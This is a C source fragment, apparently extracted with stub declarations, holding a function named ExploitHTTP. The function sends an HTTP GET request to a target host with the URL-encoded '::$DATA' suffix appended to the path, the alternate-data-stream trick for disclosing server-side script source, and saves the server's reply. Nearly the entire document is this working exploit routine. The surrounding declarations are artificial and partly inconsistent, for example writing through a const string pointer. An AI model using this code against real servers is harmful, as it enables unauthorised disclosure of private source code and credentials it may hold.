
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int * HINTERNET ;


 int BUFSIZ ;
 int * HttpOpenRequest (int *,char*,char const*,char*,int *,int *,unsigned long,int ) ;
 int HttpSendRequest (int *,int *,int ,int *,int ) ;
 unsigned long INTERNET_FLAG_NO_AUTH ;
 unsigned long INTERNET_FLAG_NO_AUTO_REDIRECT ;
 unsigned long INTERNET_FLAG_NO_CACHE_WRITE ;
 unsigned long INTERNET_FLAG_NO_COOKIES ;
 unsigned long INTERNET_FLAG_RELOAD ;
 int INTERNET_SERVICE_HTTP ;
 int InternetCloseHandle (int *) ;
 int * InternetConnect (int *,char const*,int,int *,int *,int ,int ,int ) ;
 scalar_t__ InternetReadFile (int *,char*,int,unsigned long*) ;
 int exit (int) ;
 int fclose (int ) ;
 int file ;
 int fwrite (char*,unsigned long,int,int ) ;
 int httpport ;
 int printf (char*,...) ;
 int sleep (int) ;
 int stdout ;
 int strcat (char const*,char*) ;

void ExploitHTTP (HINTERNET inet, const char *host, const char *exp)
{

   HINTERNET connection;
    HINTERNET request;
    unsigned long flags;

 char buffer[BUFSIZ];
    unsigned long len;


 printf("HOST: %s\n", host);
 printf("PORT: %i\n", httpport);

 if ((connection = InternetConnect(inet, host, httpport,
          ((void*)0), ((void*)0), INTERNET_SERVICE_HTTP, 0, 0))
     == ((void*)0))
 {
  printf("Failed to Connect...Exiting\n");
  InternetCloseHandle(inet);
  fclose(file);
  exit(1);
 }

 flags = INTERNET_FLAG_NO_AUTH | INTERNET_FLAG_NO_AUTO_REDIRECT |
     INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES |
     INTERNET_FLAG_RELOAD;

 strcat(exp, "%3A%3A%24%44%41%54%41");

 request = HttpOpenRequest(connection, "GET", exp, "HTTP/1.0", ((void*)0), ((void*)0), flags, 0);
 if (request == ((void*)0))
 {
  printf("HTTP Open Request failed....Exiting\n");
  InternetCloseHandle(connection);
  InternetCloseHandle(inet);
  fclose(file);
  exit(1);
 }
 if (!HttpSendRequest(request, ((void*)0), 0, ((void*)0), 0))
 {
  printf("HTTP Send Request failed....Exiting\n");
  InternetCloseHandle(request);
  InternetCloseHandle(connection);
  InternetCloseHandle(inet);
  fclose(file);
  exit(1);
 }
 printf("Exploit Sent...Dumping HTTP Return Packet...");
 sleep(1000);

 while (InternetReadFile(request, buffer, sizeof buffer, &len) && len > 0)
 {
  fwrite(buffer, len, 1, file);
  if (fwrite(buffer, len, 1, stdout) < 1)
  {
    printf("Error Outputting HTTP Return Packet\n");
  }
 }
 InternetCloseHandle(request);
    InternetCloseHandle(connection);
}
